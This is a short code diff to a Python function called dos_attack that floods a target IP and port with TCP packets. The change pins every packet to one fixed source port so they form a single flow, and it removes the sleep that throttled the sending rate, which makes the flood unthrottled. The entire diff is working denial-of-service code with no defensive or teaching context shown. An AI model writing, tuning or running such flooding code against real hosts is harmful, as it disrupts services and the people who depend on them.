@@ -41,24 +41,23 @@ def dos_attack(attack_id, target_ip, target_port, duration, rate):
     end_time = time.time() + duration
     sent = 0
 
+    # 🔥 FIXED FLOW PARAMETERS
+    fixed_sport = random.randint(1024, 65535)
+
     while time.time() < end_time:
         if not active_attacks[attack_id]["running"]:
             break
 
-        # 🔥 CREATE NEW PACKET EACH TIME
+        # SAME dst + SAME sport = SAME FLOW
         packet = IP(dst=target_ip)/TCP(
             dport=target_port,
-            sport=random.randint(1024, 65535)
+            sport=fixed_sport
         )
 
         send(packet, verbose=0)
         sent += 1
 
         active_attacks[attack_id]["packets_sent"] = sent
-
-        # 🔥 BURST INSTEAD OF LINEAR
-        if sent % rate == 0:
-            time.sleep(0.1)
 
     active_attacks[attack_id]["running"] = False
 
